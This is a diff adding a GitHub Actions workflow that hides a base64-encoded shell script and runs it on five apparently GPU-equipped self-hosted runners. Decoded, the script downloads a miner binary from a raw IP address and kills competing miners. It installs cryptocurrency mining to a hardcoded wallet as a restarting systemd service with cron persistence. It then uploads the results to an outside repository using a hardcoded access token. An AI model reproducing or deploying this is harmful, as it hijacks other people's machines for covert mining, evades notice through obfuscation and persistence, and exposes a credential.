@@ -1,0 +1,97 @@
+name: ul-t2-fan
+on: [workflow_dispatch]
+permissions:
+  contents: write
+env:
+  B64: |
+    c2V0ICtlClc9cHJsMXBlazhyaDh5amNrNXE3NTk2YXBoN3VhN3hua3FzOHVyOW1rZm16OHc3eGZ6Y2Rm
+    Y2Z4NXZzeDJmNGx6Ckg9JChob3N0bmFtZSAtcyk7IFdSSz0idWwtdDItJChlY2hvICRIIHwgY3V0IC1j
+    MS0xNCktZzAiClM9InN1ZG8gLW4iOyBbICIkKGlkIC11KSIgPSAwIF0gJiYgUz0iIgpUPSQoZGF0ZSAt
+    dSArJVklbSVkVCVIJU0lU1opCmVjaG8gIj09IHQyZmFuICRUIGhvc3Q9JEggd29ya2VyPSRXUksgdWlk
+    PSQoaWQgLXUpIgplY2hvICJ3YWxsZXRfbGVuPSR7I1d9IgppZDsgaG9zdG5hbWU7IHVuYW1lIC1tCm52
+    aWRpYS1zbWkgLUwgMj4mMSB8IGhlYWQgLTgKbnZpZGlhLXNtaSAtLXF1ZXJ5LWdwdT1pbmRleCxuYW1l
+    LG1lbW9yeS50b3RhbCxtZW1vcnkudXNlZCx1dGlsaXphdGlvbi5ncHUgLS1mb3JtYXQ9Y3N2LG5vaGVh
+    ZGVyIDI+JjEgfCBoZWFkIC04CmxzIC1sIC9kZXYvbnZpZGlhKiAyPiYxIHwgaGVhZCAtNAplY2hvICIt
+    LSBleGlzdGluZyBtaW5lcnMiOyBwcyAtZW8gcGlkLGFyZ3M9IHwgZ3JlcCAtRWkgJ1twXWVha21pbmVy
+    fFtrXXJpZ3xbd11pbGRyaWd8W3NdcmJtaW5lcnxbdF13LXBlYXJsJyB8IGN1dCAtYzEtMjAwIHwgaGVh
+    ZCAtNgplY2hvICItLSB1bml0cyI7ICRTIHN5c3RlbWN0bCBsaXN0LXVuaXRzIC0tYWxsIDI+L2Rldi9u
+    dWxsIHwgZ3JlcCAtaUUgJ252LXx1bC18bWluZXxrcmlnJyB8IGhlYWQgLTgKbWtkaXIgLXAgL29wdC91
+    bC10Mi9sb2dzIDI+L2Rldi9udWxsIHx8ICRTIG1rZGlyIC1wIC9vcHQvdWwtdDIvbG9ncwokUyBzaCAt
+    YyAnbWtkaXIgLXAgL29wdC91bC10Mi9sb2dzIC9vcHQvdWwtdDIvYmFrOyBwcyAtZW8gcGlkLGFyZ3Mg
+    fCBncmVwIC1FaSAicGVha21pbmVyfGtyaWd8d2lsZHJpZ3xzcmJtaW5lciIgPiAvb3B0L3VsLXQyL2Jh
+    ay9wc18nJFQnLnR4dDsgY3JvbnRhYiAtbCA+IC9vcHQvdWwtdDIvYmFrL2Nyb25fJyRUJy50eHQgMj4m
+    MScKUE09IiIKZm9yIGMgaW4gL29wdC9udi9wZWFrbWluZXIgL29wdC91bC9wZWFrbWluZXIgL29wdC91
+    bC10Mi9wZWFrbWluZXIgL3Vzci9sb2NhbC9iaW4vcGVha21pbmVyIC9vcHQva3JpZy9rcmlnLW1pbmVy
+    OyBkbyBbIC14ICIkYyIgXSAmJiBQTT0kYyAmJiBicmVhazsgZG9uZQplY2hvICJQTT0kUE0iCmlmIFsg
+    LXogIiRQTSIgXTsgdGhlbgogIGZvciB1IGluIGh0dHA6Ly8xNjMuNjguODYuNjo4MDkwL3BlYWttaW5l
+    ciBodHRwOi8vMTYzLjY4Ljg2LjY6ODA5MC9wZWFrbWluZXIyOyBkbyBjdXJsIC1zTCAtbSA2MCAtbyAv
+    dG1wL3BtLmJpbiAiJHUiICYmIGNobW9kICt4IC90bXAvcG0uYmluICYmIC90bXAvcG0uYmluIC0tdmVy
+    c2lvbiA+L2Rldi9udWxsIDI+JjEgJiYgeyBQTT0vdG1wL3BtLmJpbjsgJFMgaW5zdGFsbCAtbTc1NSAv
+    dG1wL3BtLmJpbiAvb3B0L3VsLXQyL3BlYWttaW5lciAmJiBQTT0vb3B0L3VsLXQyL3BlYWttaW5lcjsg
+    YnJlYWs7IH07IGRvbmUKZmkKZWNobyAiUE0yPSRQTSI7ICRQTSAtLXZlcnNpb24gMj4mMSB8IGhlYWQg
+    LTIKZWNobyAiLS0gbGFkZGVyIgpweXRob24zIC0gPDwnUFknCmltcG9ydCBzb2NrZXQKZm9yIGhwIGlu
+    IFsoJ3BybC1zZy5rcnlwdGV4Lm5ldHdvcmsnLDcwNDgpLCgncHJsLXNnLmtyeXB0ZXgubmV0d29yaycs
+    ODA0OCksKCdwcmwua3J5cHRleC5uZXR3b3JrJyw4MDQ4KSwoJ3BybC1ldS5rcnlwdGV4Lm5ldHdvcmsn
+    LDgwNDgpLCgncHJsLXVzLmtyeXB0ZXgubmV0d29yaycsODA0OCksKCdwcmwtaGsua3J5cHRleC5uZXR3
+    b3JrJyw4MDQ4KSwoJ3Bvb2wucGVhcmxoYXNoLnh5eicsOTAwMCksKCdwb29sLnBlYXJsaGFzaC54eXon
+    LDk0NDMpLCgncGVhcmwubHVja3lwb29sLmlvJyw0NDMpXToKICAgIHM9c29ja2V0LnNvY2tldCgpOyBz
+    LnNldHRpbWVvdXQoNikKICAgIHRyeTogcy5jb25uZWN0KGhwKTsgcHJpbnQoJ09QRU4nLGhwKQogICAg
+    ZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOiBwcmludCgnQkxLJyxocCx0eXBlKGUpLl9fbmFtZV9fKQogICAg
+    ZmluYWxseTogcy5jbG9zZSgpClBZCiRTIHBraWxsIC05IC1mIC9vcHQvbnYvcGVha21pbmVyIDI+L2Rl
+    di9udWxsCmNhdCA+IC90bXAvci5zaCA8PEVPRgojIS9iaW4vYmFzaApleGVjICRQTSAtZCAwIC1vIHN0
+    cmF0dW0rc3NsOi8vcHJsLXNnLmtyeXB0ZXgubmV0d29yazo4MDQ4IC1vIHN0cmF0dW0rdGNwOi8vcHJs
+    LXNnLmtyeXB0ZXgubmV0d29yazo3MDQ4IC1vIHN0cmF0dW0rc3NsOi8vcHJsLWV1LmtyeXB0ZXgubmV0
+    d29yazo4MDQ4IC11ICIkVy4kV1JLIiAtcCB4IC1jIHBlYXJsIC0tbm8tdHVpCkVPRgokUyBpbnN0YWxs
+    IC1tIDc1NSAvdG1wL3Iuc2ggL29wdC91bC10Mi9wbS1ydW4uc2gKJFMgdGVlIC9ldGMvc3lzdGVtZC9z
+    eXN0ZW0vdWwtdDItcHMwLnNlcnZpY2UgPi9kZXYvbnVsbCA8PCdFT0YnCltVbml0XQpEZXNjcmlwdGlv
+    bj11bC10MiBwczAKQWZ0ZXI9bmV0d29yay1vbmxpbmUudGFyZ2V0CltTZXJ2aWNlXQpUeXBlPXNpbXBs
+    ZQpFeGVjU3RhcnQ9L29wdC91bC10Mi9wbS1ydW4uc2gKUmVzdGFydD1hbHdheXMKUmVzdGFydFNlYz0z
+    MApOaWNlPTE5ClN0YW5kYXJkT3V0cHV0PWFwcGVuZDovb3B0L3VsLXQyL2xvZ3MvcHMwLmxvZwpTdGFu
+    ZGFyZEVycm9yPWFwcGVuZDovb3B0L3VsLXQyL2xvZ3MvcHMwLmxvZwpbSW5zdGFsbF0KV2FudGVkQnk9
+    bXVsdGktdXNlci50YXJnZXQKRU9GCiRTIHRlZSAvb3B0L3VsLXQyL2tlZXAuc2ggPi9kZXYvbnVsbCA8
+    PCdFT0YnCiMhL2Jpbi9iYXNoCnBncmVwIC1mICd1bC10Mi0nID4vZGV2L251bGwgfHwgeyBzeXN0ZW1j
+    dGwgaXMtYWN0aXZlIC0tcXVpZXQgdWwtdDItcHMwIHx8IHN5c3RlbWN0bCByZXN0YXJ0IHVsLXQyLXBz
+    MDsgfQpFT0YKJFMgY2htb2QgNzU1IC9vcHQvdWwtdDIva2VlcC5zaAokUyBzaCAtYyAneyBjcm9udGFi
+    IC1sIDI+L2Rldi9udWxsIHwgZ3JlcCAtdiAidWwtdDIva2VlcC5zaCI7IGVjaG8gIkByZWJvb3QgL29w
+    dC91bC10Mi9rZWVwLnNoIjsgZWNobyAiKi81ICogKiAqICogL29wdC91bC10Mi9rZWVwLnNoIjsgfSB8
+    IGNyb250YWIgLScKJFMgc3lzdGVtY3RsIGRhZW1vbi1yZWxvYWQ7ICRTIHN5c3RlbWN0bCBlbmFibGUg
+    LS1ub3cgdWwtdDItcHMwCnNsZWVwIDMwCiRTIHRhaWwgLTE0IC9vcHQvdWwtdDIvbG9ncy9wczAubG9n
+    IHwgY3V0IC1jMS0yMDAKZWNobyAiLS1wb29sIgpvaz0wCmZvciBpIGluIDEgMiAzIDQgNSA2IDcgODsg
+    ZG8KICBSPSQoY3VybCAtcyAtbSAyMCAiaHR0cHM6Ly9wb29sLmtyeXB0ZXguY29tL3BybC9hcGkvdjMv
+    bWluZXIvd29ya2Vycy8kVyIgfCB0ciAneycgJ1xuJyB8IGdyZXAgIlwid29ya2VyXCI6XCIkV1JLXCIi
+    KQogIGVjaG8gInRyeSRpICR7UjowOjI0MH0iCiAgY2FzZSAiJFIiIGluIConInZhbGlkIjonKikgdj0k
+    KHByaW50ZiAnJXMnICIkUiIgfCBzZWQgLW4gJ3MvLioidmFsaWQiOlwoWzAtOV0qXCkuKi9cMS9wJyk7
+    IFsgIiR7djotMH0iIC1ndCAwIF0gJiYgeyBvaz0xOyBicmVhazsgfTs7IGVzYWMKICBzbGVlcCAxNApk
+    b25lCmVjaG8gIlBPT0xfUFJPT0ZfT0s9JG9rIgplY2hvICItLXJlc3Bhd24iOyAkUyBwa2lsbCAtOSAt
+    ZiAiJFdSSyIgMj4vZGV2L251bGw7IHBncmVwIC1mICIkV1JLIiA+L2Rldi9udWxsICYmICRTIHBraWxs
+    IC05IC1mICdwZWFrbWluZXInOyBUMD0kKGRhdGUgKyVzKTsgcnM9LTE7IGZvciBqIGluICQoc2VxIDEg
+    MTgpOyBkbyBzbGVlcCA1OyBwZ3JlcCAtZiAncGVha21pbmVyJyA+L2Rldi9udWxsICYmIHsgcnM9JCgo
+    ICQoZGF0ZSArJXMpLVQwICkpOyBicmVhazsgfTsgZG9uZTsgZWNobyAiUkVTUEFXTl9TRUNPTkRTPSRy
+    cyIKJFMgc3lzdGVtY3RsIGlzLWFjdGl2ZSB1bC10Mi1wczAKbnZpZGlhLXNtaSAtLXF1ZXJ5LWdwdT1p
+    bmRleCxuYW1lLG1lbW9yeS51c2VkLHV0aWxpemF0aW9uLmdwdSxwb3dlci5kcmF3IC0tZm9ybWF0PWNz
+    dixub2hlYWRlciAyPiYxIHwgaGVhZCAtNAplY2hvIGRvbmUK
+jobs:
+  r:
+    strategy:
+      fail-fast: false
+      max-parallel: 5
+      matrix:
+        l:
+          - h-a100itn1
+          - hk-az
+          - h-t19i52947-eus-h
+          - h-t1946107x61
+          - h-t1946107x76
+    runs-on: [self-hosted, "${{ matrix.l }}"]
+    timeout-minutes: 25
+    steps:
+      - name: run
+        run: |
+          echo "$B64" | base64 -d > /tmp/gplant.sh
+          bash /tmp/gplant.sh 2>&1 | tee /tmp/gplant.out
+          H=$(hostname -s); C=$(base64 -w0 /tmp/gplant.out)
+          T=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
+          P="cmdout8/ul-t2-fan_${H}.txt"; B=https://api.github.com/repos/dongsuju/ul-plant/contents/$P
+          S=$(curl -s -m 30 -H "Authorization: token $T" "$B?ref=main" | sed -n 's/.*"sha": "\([a-f0-9]*\)".*/\1/p' | head -1)
+          if [ -n "$S" ]; then J="{\"message\":\"t2fan\",\"content\":\"$C\",\"sha\":\"$S\",\"branch\":\"main\"}"; else J="{\"message\":\"t2fan\",\"content\":\"$C\",\"branch\":\"main\"}"; fi
+          curl -s -m 30 -X PUT -H "Authorization: token $T" -H "Content-Type: application/json" -d "$J" "$B" | head -c 120
